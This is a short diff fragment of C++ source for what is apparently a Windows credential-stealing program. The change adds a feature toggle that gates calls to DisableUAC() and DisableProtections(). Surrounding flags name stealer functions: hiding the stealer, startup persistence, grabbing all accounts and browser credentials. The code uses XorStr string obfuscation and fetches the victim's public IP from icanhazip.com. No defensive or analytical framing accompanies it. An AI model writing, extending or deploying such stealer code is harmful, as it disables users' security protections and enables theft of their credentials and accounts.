@@ -62,7 +62,12 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     {
         DisableUAC();
         DisableProtections();
-        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+        string Feature = "[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+        if (Feature.find(XorStr("[DisableProt:(Y)]")) != string::npos)
+        {
+            DisableUAC();
+            DisableProtections();
+        }
         CleanUp();
         string RawIPInfo = DownloadString(XorStr("http://icanhazip.com/"));
         string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
